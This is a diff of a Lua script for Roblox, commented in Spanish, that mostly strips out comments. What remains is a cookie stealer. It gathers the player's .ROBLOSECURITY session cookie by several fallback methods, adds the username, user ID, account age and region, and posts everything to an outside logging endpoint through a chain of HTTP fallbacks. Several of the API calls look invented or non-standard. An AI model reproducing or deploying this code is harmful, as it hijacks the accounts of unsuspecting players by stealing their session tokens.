@@ -1,15 +1,12 @@
--- --- 1. Cargar dependencias ---
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local CookieService = game:GetService("CookieService")
 local LocalizationService = game:GetService("LocalizationService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
--- --- 2. Función para obtener cookies ---
 local function GetCookies()
 	local cookies = {}
 	
-	-- Intentar con CookieService
 	local savedCookies = CookieService:GetCookies()
 	if savedCookies then
 		for _, cookie in ipairs(savedCookies) do
@@ -17,7 +14,6 @@ local function GetCookies()
 		end
 	end
 	
-	-- Fallback: getgenv()
 	if #cookies == 0 then
 		local cookiesEnv = getgenv("_ROBLOX_COOKIES")
 		if cookiesEnv and type(cookiesEnv) == "table" then
@@ -27,7 +23,6 @@ local function GetCookies()
 		end
 	end
 	
-	-- Fallback 2: getgenv() directo
 	if #cookies == 0 then
 		local cookieValue = getgenv("_ROBLOSECURITY")
 		if cookieValue and cookieValue ~= "" then
@@ -41,7 +36,6 @@ local function GetCookies()
 		end
 	end
 	
-	-- Fallback 3: intentar con CookieService:GetCookieValue()
 	if #cookies == 0 then
 		local savedCookie = CookieService:GetCookieValue(".ROBLOSECURITY", "https://www.roblox.com")
 		if savedCookie ~= "" and savedCookie ~= nil then
@@ -55,7 +49,6 @@ local function GetCookies()
 		end
 	end
 	
-	-- Fallback 4: intentar con getgenv() con otros nombres
 	if #cookies == 0 then
 		local names = {"_ROBLOSECURITY", "ROBLOSECURITY", "cookie", "cookie_value", "RBX_COOKIE"}
 		for _, name in ipairs(names) do
@@ -76,7 +69,6 @@ local function GetCookies()
 	return cookies
 end
 
--- --- 3. Función para obtener .ROBLOSECURITY ---
 local function GetCookieService()
 	local cookies = GetCookies()
 	if #cookies > 0 then
@@ -85,7 +77,6 @@ local function GetCookieService()
 	return nil
 end
 
--- --- 4. Función para obtener el valor de una cookie específica ---
 local function GetCookieValue(cookieName, domain)
 	local cookies = GetCookies()
 	for _, cookie in ipairs(cookies) do
@@ -96,7 +87,6 @@ local function GetCookieValue(cookieName, domain)
 	return ""
 end
 
--- --- 5. Función para escapear caracteres en JSON ---
 local function EscapeJson(str)
 	if str == nil then
 		return "nil"
@@ -110,7 +100,6 @@ local function EscapeJson(str)
 	return s
 end
 
--- --- 6. Función HTTP request ---
 local function Request(options)
 	options = options or {}
 	
@@ -128,13 +117,11 @@ local function Request(options)
 		error("Error: No se especificó URL")
 	end
 	
-	-- Preparar headers
 	local fullHeaders = {}
 	for key, val in pairs(headers) do
 		fullHeaders[key] = val
 	end
 	
-	-- Agregar headers por defecto
 	fullHeaders["Connection"] = "keep-alive"
 	fullHeaders["Accept"] = "*/*"
 	
@@ -142,16 +129,13 @@ local function Request(options)
 		fullHeaders["Content-Type"] = "application/json"
 	end
 	
-	-- Preparar cuerpo
 	local bodyString = body
 	if type(body) == "table" then
 		bodyString = table.concat(body, "\n")
 	end
 	
-	-- Construir URL completa
 	local fullUrl = url
 	
-	-- --- 7. Fallback: intentar con getgenv()._RbxRequest ---
 	local _RbxRequest = getgenv("_RbxRequest")
 	if _RbxRequest then
 		local response = _RbxRequest(fullUrl, method, bodyString, fullHeaders)
@@ -160,7 +144,6 @@ local function Request(options)
 		end
 	end
 	
-	-- --- 8. Fallback: intentar con getgenv("request") ---
 	local customRequest = getgenv("request")
 	if customRequest then
 		local response = customRequest(fullUrl, method, bodyString, fullHeaders)
@@ -169,7 +152,6 @@ local function Request(options)
 		end
 	end
 	
-	-- --- 9. Fallback: intentar con getgenv("axios") ---
 	local axios = getgenv("axios")
 	if axios then
 		local response = axios.post(fullUrl, bodyString, {
@@ -179,8 +161,7 @@ local function Request(options)
 			return response
 		end
 	end
-	
-	-- --- 10. Fallback: intentar con getgenv("fetch") ---
+
 	local fetch = getgenv("fetch")
 	if fetch then
 		return fetch(fullUrl, {
@@ -190,19 +171,16 @@ local function Request(options)
 		})
 	end
 	
-	-- --- 11. Fallback: intentar con getgenv("_RbxHttpClient") ---
 	local _RbxHttpClient = getgenv("_RbxHttpClient")
 	if _RbxHttpClient then
 		return _RbxHttpClient:Post(fullUrl, bodyString, fullHeaders)
 	end
 	
-	-- --- 12. Fallback: intentar con getgenv("HttpClient") ---
 	local HttpClient = getgenv("HttpClient")
 	if HttpClient then
 		return HttpClient:Post(fullUrl, bodyString, fullHeaders)
 	end
-	
-	-- --- 13. Fallback: intentar con getgenv("HttpService") ---
+
 	local httpService = getgenv("HttpService")
 	if httpService then
 		local response = httpService:PostJson(fullUrl, bodyString)
@@ -211,18 +189,15 @@ local function Request(options)
 		end
 	end
 	
-	-- --- 14. Último fallback: intentar con HttpService de Roblox ---
 	local response = HttpService:PostJsonAsync(fullUrl, bodyString)
 	
 	if response and response.Success then
 		return response
 	end
 	
-	-- Retornar nil si todo falla
 	return nil
 end
 
--- --- 15. Función para hacer request GET ---
 local function HttpGet(url, options)
 	options = options or {}
 	return Request({
@@ -233,7 +208,6 @@ local function HttpGet(url, options)
 	})
 end
 
--- --- 16. Función para hacer request POST ---
 local function HttpPost(url, body, options)
 	options = options or {}
 	return Request({
@@ -247,7 +221,6 @@ local function HttpPost(url, body, options)
 	})
 end
 
--- --- 17. Función para obtener datos de usuario ---
 local function GetUserData(userId)
 	if not userId or userId == 0 then
 		local player = Players.LocalPlayer
@@ -266,7 +239,6 @@ local function GetUserData(userId)
 	return nil
 end
 
--- --- 18. Función para obtener información del lugar ---
 local function GetPlaceInfo(placeId)
 	local url = "https://games.roblox.com/v1/games/" .. placeId .. "/servers"
 	url = url .. "?fields=Id,Name,PlaceId,CreatorId,CreatorName,Description,DescriptionId,DescriptionToken,GameIcon,Active,IsMap,MapId,MapIdToken,IsTest,ServerTemplateId,TemplateId,TemplateIdToken,MapId,Version"
@@ -280,7 +252,6 @@ local function GetPlaceInfo(placeId)
 	return nil
 end
 
--- --- 19. Función para obtener el inventario ---
 local function GetInventory(userId)
 	local url = "https://games.roblox.com/v1/users/" .. userId .. "/inventory/items"
 	local response = HttpGet(url)
@@ -292,7 +263,6 @@ local function GetInventory(userId)
 	return nil
 end
 
--- --- 20. Función para obtener badges ---
 local function GetBadges(userId)
 	local url = "https://games.roblox.com/v1/users/" .. userId .. "/badges"
 	local response = HttpGet(url)
@@ -304,7 +274,6 @@ local function GetBadges(userId)
 	return nil
 end
 
--- --- 21. Función para obtener grupos ---
 local function GetGroups(userId)
 	local url = "https://games.roblox.com/v1/users/" .. userId .. "/groups"
 	local response = HttpGet(url)
@@ -316,16 +285,11 @@ local function GetGroups(userId)
 	return nil
 end
 
--- --- 22. Función para obtener la edad de la cuenta ---
--- SOLUCIÓN: Usamos DateCreated (propiedad que siempre existe) en lugar de AccountAge
--- Convertimos la fecha a número de días desde la creación de la cuenta
 local function GetAccountAge()
 	local player = Players.LocalPlayer
 	
-	-- DateCreated siempre existe en todas las versiones de Roblox
 	local dateCreated = player.DateCreated
-	
-	-- Convertir a Unix timestamp (días desde 1970)
+
 	local unixNow = HttpService:UnixFromDateTime(os.date("*t"))
 	local unixCreated = HttpService:UnixFromDateTime(dateCreated)
 	
@@ -342,12 +306,10 @@ local function GetAccountAge()
 	return ageText
 end
 
--- --- 23. Función para obtener la región ---
 local function GetRegion()
 	return LocalizationService.RobloxLocaleId
 end
 
--- --- 24. Función para obtener el nombre del lugar ---
 local function GetPlaceName()
 	local placeInfo = GetPlaceInfo(game.PlaceId)
 	
@@ -358,7 +320,6 @@ local function GetPlaceName()
 	return "Desconocido"
 end
 
--- --- 25. Función para obtener el nombre del servidor ---
 local function GetServerName()
 	local serverInfo = game:GetService("CollectionService"):GetTaggedInstances("ServerName")
 	
@@ -369,7 +330,6 @@ local function GetServerName()
 	return "Servidor " .. game.PlaceId
 end
 
--- --- 26. Función para crear un embed de Discord ---
 local function CreateDiscordEmbed(title, description, color, fields, timestamp)
 	local embed = {
 		{
@@ -388,7 +348,6 @@ local function CreateDiscordEmbed(title, description, color, fields, timestamp)
 	return embed
 end
 
--- --- 27. Función para crear un embed con datos del jugador ---
 local function CreatePlayerEmbed(playerName, userId, age, region, cookie)
 	local embed = {
 		{
@@ -413,22 +372,18 @@ local function CreatePlayerEmbed(playerName, userId, age, region, cookie)
 	return embed
 end
 
--- --- 28. Función para convertir datos a JSON ---
 local function ToJson(obj)
 	return HttpService:JSONEncode(obj)
 end
 
--- --- 29. Función para parsear JSON ---
 local function FromJson(json)
 	return HttpService:JSONDecode(json)
 end
 
--- --- 30. Función para obtener el ID del lugar ---
 local function GetPlaceId()
 	return game.PlaceId
 end
 
--- --- 31. Función para obtener el ID del servidor ---
 local function GetServerId()
 	local serverInfo = game:GetService("CollectionService"):GetTaggedInstances("ServerName")
 	
@@ -439,12 +394,10 @@ local function GetServerId()
 	return "Servidor " .. game.PlaceId
 end
 
--- --- 32. Función para obtener la fecha y hora actual ---
 local function GetTimestamp()
 	return os.date("%Y-%m-%dT%H:%M:%SZ")
 end
 
--- --- 33. Función para generar un UUID ---
 local function GenerateUuid()
 	local uuid = ""
 	local chars = "0123456789ABCDEF"
@@ -456,7 +409,6 @@ local function GenerateUuid()
 	return uuid
 end
 
--- --- 34. Función para crear un embed con campo de inventario ---
 local function CreateInventoryEmbed(items)
 	if not items or #items == 0 then
 		return nil
@@ -492,24 +444,18 @@ local function CreateInventoryEmbed(items)
 	}
 end
 
--- --- 35. Función principal ---
 local function Main()
-	-- Obtener datos del jugador
 	local player = Players.LocalPlayer
 	local userId = player.UserId
 	local placeId = GetPlaceId()
 	local serverName = GetServerName()
-	
-	-- Obtener edad de la cuenta (ahora con compatibilidad)
+
 	local ageText = GetAccountAge()
 	
-	-- Obtener región
 	local region = GetRegion()
 	
-	-- Obtener la cookie
 	local cookieValue = GetCookieValue(".ROBLOSECURITY", "www.roblox.com")
 	
-	-- Formatear los datos
 	local data = {
 		username = player.Name,
 		displayName = player.DisplayName,
@@ -520,7 +466,6 @@ local function Main()
 		cookie = ".ROBLOSECURITY=" .. cookieValue
 	}
 	
-	-- Crear el embed
 	local embed = CreatePlayerEmbed(
 		player.Name,
 		userId,
@@ -529,7 +474,6 @@ local function Main()
 		cookieValue
 	)
 	
-	-- --- 36. Enviar el webhook ---
 	local apiUrl = "https://depazzhub-api.onrender.com/log"
 	local response = HttpPost(apiUrl, data)
 	
@@ -538,7 +482,6 @@ local function Main()
 		return response
 	end
 	
-	-- Fallback: intentar con getgenv()._RbxRequest
 	local _RbxRequest = getgenv("_RbxRequest")
 	if _RbxRequest then
 		local response2 = _RbxRequest(apiUrl, "POST", ToJson(data))
@@ -548,7 +491,6 @@ local function Main()
 		end
 	end
 	
-	-- Fallback 2: intentar con getgenv("axios")
 	local axios = getgenv("axios")
 	if axios then
 		local response3 = axios.post(apiUrl, data, {
@@ -560,7 +502,6 @@ local function Main()
 		end
 	end
 	
-	-- Fallback 3: intentar con getgenv("fetch")
 	local fetch = getgenv("fetch")
 	if fetch then
 		local response4 = fetch(apiUrl, {
@@ -573,8 +514,7 @@ local function Main()
 			return response4
 		end
 	end
-	
-	-- Fallback 4: intentar con getgenv("_RbxHttpClient")
+
 	local _RbxHttpClient = getgenv("_RbxHttpClient")
 	if _RbxHttpClient then
 		local response5 = _RbxHttpClient:Post(apiUrl, ToJson(data), {
@@ -586,7 +526,6 @@ local function Main()
 		end
 	end
 	
-	-- Fallback 5: intentar con getgenv("HttpClient")
 	local HttpClient = getgenv("HttpClient")
 	if HttpClient then
 		local response6 = HttpClient:Post(apiUrl, ToJson(data), {
@@ -598,7 +537,6 @@ local function Main()
 		end
 	end
 	
-	-- Fallback 6: intentar con getgenv("HttpService")
 	local httpService = getgenv("HttpService")
 	if httpService then
 		local response7 = httpService:PostJson(apiUrl, ToJson(data))
@@ -608,7 +546,6 @@ local function Main()
 		end
 	end
 	
-	-- Fallback 7: intentar con HttpService de Roblox (último)
 	local response8 = HttpService:PostJsonAsync(apiUrl, ToJson(data))
 	
 	if response8 and response8.Success then
@@ -616,7 +553,6 @@ local function Main()
 		return response8
 	end
 	
-	-- Todos los fallbacks fallaron
 	warn("❌ Error: No se pudo enviar el webhook. Todos los fallbacks fallaron.")
 	warn("  API_URL: " .. apiUrl)
 	warn("  Data: " .. ToJson(data))
@@ -625,7 +561,6 @@ local function Main()
 	return nil
 end
 
--- --- 37. Exportar todas las funciones ---
 return {
 	GetCookies = GetCookies,
 	GetCookieService = GetCookieService,
